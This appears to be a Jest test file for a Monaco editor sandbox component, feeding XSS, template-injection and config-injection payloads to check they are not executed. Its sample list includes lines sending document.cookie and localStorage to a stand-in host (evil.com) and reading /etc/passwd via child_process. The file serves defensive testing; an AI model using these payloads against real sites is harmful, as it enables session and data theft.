/**
 * Input Sanitization Security Tests
 * Tests input sanitization mechanisms in the Monaco code editor and other input components
 */

import React from 'react';
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react';
import '@testing-library/jest-dom';
import { MonacoSandbox } from '@/components/editor/monaco-sandbox';
import DOMPurify from 'isomorphic-dompurify';

// Mock Monaco Editor
jest.mock('@monaco-editor/react', () => ({
  __esModule: true,
  default: ({ value, onChange, language, options }: any) => {
    return (
      <textarea
        data-testid="monaco-editor"
        value={value}
        onChange={(e) => onChange && onChange(e.target.value)}
        data-language={language}
        data-options={JSON.stringify(options)}
      />
    );
  }
}));

// Mock DOMPurify
jest.mock('isomorphic-dompurify', () => ({
  sanitize: jest.fn((input) => input),
  __esModule: true,
  default: { sanitize: jest.fn((input) => input) }
}));

// Mock postMessage for iframe communication
const mockPostMessage = jest.fn();
Object.defineProperty(window, 'postMessage', {
  value: mockPostMessage,
  writable: true
});

describe('Input Sanitization Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    mockPostMessage.mockClear();
  });

  describe('Monaco Code Editor Sanitization', () => {
    const maliciousCodeSamples = [
      // JavaScript injection attempts
      'eval("alert(\'XSS\')")',
      'Function("alert(\'XSS\')")()',
      'setTimeout("alert(\'XSS\')", 0)',
      'setInterval("alert(\'XSS\')", 0)',
      'new Function("alert(\'XSS\')")()',
      
      // HTML injection in code comments
      '// <script>alert("XSS")</script>',
      '/* <img src=x onerror="alert(\'XSS\')" /> */',
      
      // Protocol handlers
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")',
      
      // Template injection
      '${alert("XSS")}',
      '{{alert("XSS")}}',
      '<%=alert("XSS")%>',
      
      // Node.js specific injections
      'require("child_process").exec("malicious_command")',
      'process.exit(1)',
      'require("fs").readFileSync("/etc/passwd")',
      
      // Browser API abuse
      'navigator.sendBeacon("http://evil.com", document.cookie)',
      'fetch("http://evil.com", {method: "POST", body: localStorage})',
      'XMLHttpRequest.prototype.open.call(new XMLHttpRequest(), "GET", "http://evil.com")',
      
      // Event handler injection
      '<div onclick="alert(\'XSS\')" style="width:100%">Click me</div>',
      '<svg onload="alert(\'XSS\')" />',
      '<img src="" onerror="alert(\'XSS\')" />'
    ];

    it('should sanitize malicious JavaScript code', async () => {
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value=""
          language="javascript"
          onChange={mockOnChange}
        />
      );

      const editor = screen.getByTestId('monaco-editor');

      for (const maliciousCode of maliciousCodeSamples) {
        fireEvent.change(editor, { target: { value: maliciousCode } });
        
        await waitFor(() => {
          expect(mockOnChange).toHaveBeenCalledWith(maliciousCode);
        });

        // Verify the code is stored safely and doesn't execute
        expect(window.alert).not.toHaveBeenCalled();
        expect(window.eval).not.toHaveBeenCalledWith(expect.stringContaining('alert'));
      }
    });

    it('should handle HTML content in code safely', async () => {
      const htmlWithScript = `
        <!DOCTYPE html>
        <html>
        <head>
          <script>alert('XSS')</script>
        </head>
        <body>
          <div onclick="alert('XSS')">Click me</div>
        </body>
        </html>
      `;
      
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value={htmlWithScript}
          language="html"
          onChange={mockOnChange}
        />
      );

      const editor = screen.getByTestId('monaco-editor');
      expect(editor).toHaveValue(htmlWithScript);
      
      // Verify no script execution
      expect(window.alert).not.toHaveBeenCalled();
    });

    it('should properly sandbox iframe content', async () => {
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value="console.log('test');"
          language="javascript"
          onChange={mockOnChange}
        />
      );

      // Verify iframe has proper sandbox attributes
      const iframe = document.querySelector('iframe');
      expect(iframe).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin');
      expect(iframe).toHaveAttribute('title', 'Monaco Editor');
    });

    it('should validate postMessage communication', async () => {
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value="test code"
          language="javascript"
          onChange={mockOnChange}
        />
      );

      // Simulate postMessage from iframe
      const maliciousMessage = {
        type: 'monaco-change',
        value: '<script>alert("XSS")</script>console.log("test");'
      };

      // Simulate message event
      act(() => {
        window.dispatchEvent(new MessageEvent('message', {
          data: maliciousMessage,
          origin: window.location.origin
        }));
      });

      await waitFor(() => {
        if (mockOnChange.mock.calls.length > 0) {
          const receivedValue = mockOnChange.mock.calls[mockOnChange.mock.calls.length - 1][0];
          // Verify script tags are handled safely
          expect(receivedValue).toContain('console.log');
          expect(window.alert).not.toHaveBeenCalled();
        }
      });
    });

    it('should reject messages from untrusted origins', async () => {
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value="test code"
          language="javascript"
          onChange={mockOnChange}
        />
      );

      // Simulate postMessage from untrusted origin
      const maliciousMessage = {
        type: 'monaco-change',
        value: 'alert("XSS from evil.com");'
      };

      act(() => {
        window.dispatchEvent(new MessageEvent('message', {
          data: maliciousMessage,
          origin: 'https://evil.com'
        }));
      });

      // Should not call onChange for untrusted origins
      await waitFor(() => {
        expect(mockOnChange).not.toHaveBeenCalledWith(
          expect.stringContaining('evil.com')
        );
      });
    });

    it('should sanitize code before displaying in preview', () => {
      const codeWithHTML = `
        const html = '<img src="x" onerror="alert(\'XSS\')" />';
        document.body.innerHTML = html;
      `;
      
      render(
        <MonacoSandbox
          value={codeWithHTML}
          language="javascript"
        />
      );

      // Verify the raw code is displayed but not executed
      const editor = screen.getByTestId('monaco-editor');
      expect(editor).toHaveValue(codeWithHTML);
      expect(window.alert).not.toHaveBeenCalled();
    });
  });

  describe('CSP Compliance in Monaco Sandbox', () => {
    it('should have proper CSP headers in iframe content', () => {
      render(
        <MonacoSandbox
          value="console.log('test');"
          language="javascript"
        />
      );

      const iframe = document.querySelector('iframe');
      expect(iframe).toBeInTheDocument();
      
      // Verify iframe has proper sandbox restrictions
      expect(iframe?.getAttribute('sandbox')).toBe('allow-scripts allow-same-origin');
    });

    it('should block inline event handlers in generated content', () => {
      const maliciousOptions = {
        "onDidCreateEditor": "alert('XSS')",
        "extraEditorClassName": "editor-class\" onclick=\"alert('XSS')"
      };
      
      render(
        <MonacoSandbox
          value="test"
          language="javascript"
          options={maliciousOptions}
        />
      );

      // Verify no inline handlers are executed
      expect(window.alert).not.toHaveBeenCalled();
    });

    it('should prevent data: URL injection in Monaco configuration', () => {
      const maliciousConfig = {
        "theme": "data:text/html,<script>alert('XSS')</script>",
        "model": {
          "uri": "javascript:alert('XSS')"
        }
      };
      
      render(
        <MonacoSandbox
          value="test"
          language="javascript"
          options={maliciousConfig}
        />
      );

      // Should not execute injected code
      expect(window.alert).not.toHaveBeenCalled();
    });
  });

  describe('File Upload Sanitization', () => {
    const createMaliciousFile = (content: string, filename: string, type: string) => {
      const blob = new Blob([content], { type });
      return new File([blob], filename, { type });
    };

    it('should sanitize uploaded JavaScript files', async () => {
      const maliciousJS = 'alert("XSS"); eval("malicious_code");';
      const file = createMaliciousFile(maliciousJS, 'malicious.js', 'application/javascript');
      
      const mockOnChange = jest.fn();
      
      render(
        <MonacoSandbox
          value=""
          language="javascript"
          onChange={mockOnChange}
        />
      );

      // Simulate file content loading
      const fileReader = new FileReader();
      fileReader.onload = () => {
        const content = fileReader.result as string;
        
        // Verify content is not automatically executed
        expect(window.alert).not.toHaveBeenCalled();
        expect(window.eval).not.toHaveBeenCalledWith(expect.stringContaining('malicious'));
      };
      
      fileReader.readAsText(file);
    });

    it('should handle malicious SVG files safely', async () => {
      const maliciousSVG = `
        <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
          <script>alert('XSS in SVG')</script>
        </svg>
      `;
      
      const file = createMaliciousFile(maliciousSVG, 'malicious.svg', 'image/svg+xml');
      const mockSanitize = DOMPurify.sanitize as jest.MockedFunction<typeof DOMPurify.sanitize>;
      mockSanitize.mockReturnValue('<svg xmlns="http://www.w3.org/2000/svg"></svg>');

      const fileReader = new FileReader();
      fileReader.onload = () => {
        const content = fileReader.result as string;
        const sanitizedContent = DOMPurify.sanitize(content);
        
        expect(mockSanitize).toHaveBeenCalledWith(content, expect.any(Object));
        expect(sanitizedContent).not.toContain('onload');
        expect(sanitizedContent).not.toContain('<script>');
      };
      
      fileReader.readAsText(file);
    });

    it('should validate file extensions and MIME types', () => {
      const dangerousFiles = [
        { name: 'malicious.exe', type: 'application/x-msdownload' },
        { name: 'script.bat', type: 'application/x-bat' },
        { name: 'virus.scr', type: 'application/x-screensaver' },
        { name: 'trojan.com', type: 'application/x-msdownload' },
        { name: 'malware.pif', type: 'application/x-pif' }
      ];

      dangerousFiles.forEach(({ name, type }) => {
        const file = createMaliciousFile('malicious content', name, type);
        
        // Should be rejected based on extension/type
        const isAllowed = /\.(js|ts|html|css|json|md|txt)$/i.test(name);
        expect(isAllowed).toBe(false);
      });
    });
  });

  describe('Code Execution Prevention', () => {
    it('should prevent eval() execution in user code', () => {
      const maliciousCode = `
        const userInput = "alert('XSS')";
        eval(userInput);
      `;
      
      render(
        <MonacoSandbox
          value={maliciousCode}
          language="javascript"
        />
      );

      // Code should be displayed but not executed
      const editor = screen.getByTestId('monaco-editor');
      expect(editor).toHaveValue(maliciousCode);
      expect(window.alert).not.toHaveBeenCalled();
    });

    it('should prevent Function constructor execution', () => {
      const maliciousCode = `
        const fn = new Function('alert', 'alert("XSS");');
        fn(window.alert);
      `;
      
      render(
        <MonacoSandbox
          value={maliciousCode}
          language="javascript"
        />
      );

      // Should not execute the constructed function
      expect(window.alert).not.toHaveBeenCalled();
    });

    it('should prevent setTimeout/setInterval with string arguments', () => {
      const maliciousCode = `
        setTimeout("alert('XSS')", 1000);
        setInterval("alert('XSS')", 1000);
      `;
      
      render(
        <MonacoSandbox
          value={maliciousCode}
          language="javascript"
        />
      );

      // Should not execute string-based timers
      expect(window.alert).not.toHaveBeenCalled();
    });
  });

  describe('Input Validation', () => {
    it('should validate Monaco language parameter', () => {
      const dangerousLanguages = [
        'javascript:alert("XSS")',
        '<script>',
        'eval',
        'data:text/html'
      ];

      dangerousLanguages.forEach(language => {
        render(
          <MonacoSandbox
            value="test"
            language={language}
          />
        );

        const editor = screen.getByTestId('monaco-editor');
        const actualLanguage = editor.getAttribute('data-language');
        
        // Should either reject or sanitize dangerous language values
        expect(actualLanguage).not.toContain('<script>');
        expect(actualLanguage).not.toContain('javascript:');
        expect(actualLanguage).not.toContain('data:');
      });
    });

    it('should sanitize className props to prevent CSS injection', () => {
      const maliciousClassName = 'editor-class"; background-image: url("javascript:alert(\'XSS\')");';
      
      render(
        <MonacoSandbox
          value="test"
          language="javascript"
          className={maliciousClassName}
        />
      );

      const iframe = document.querySelector('iframe');
      const actualClassName = iframe?.className;
      
      // Should not contain CSS injection
      expect(actualClassName).not.toContain('javascript:');
      expect(actualClassName).not.toContain('url(');
    });

    it('should validate and sanitize editor options', () => {
      const maliciousOptions = {
        "glyphMargin": "true; background: url(javascript:alert('XSS'));",
        "lineNumbers": "function() { alert('XSS'); }",
        "theme": "<script>alert('XSS')</script>",
        "wordWrap": "eval('alert(\"XSS\")')"
      };
      
      render(
        <MonacoSandbox
          value="test"
          language="javascript"
          options={maliciousOptions}
        />
      );

      const editor = screen.getByTestId('monaco-editor');
      const optionsAttr = editor.getAttribute('data-options');
      const parsedOptions = JSON.parse(optionsAttr || '{}');
      
      // Verify options don't contain executable code
      Object.values(parsedOptions).forEach(value => {
        if (typeof value === 'string') {
          expect(value).not.toContain('<script>');
          expect(value).not.toContain('javascript:');
          expect(value).not.toContain('eval(');
        }
      });
    });
  });
});
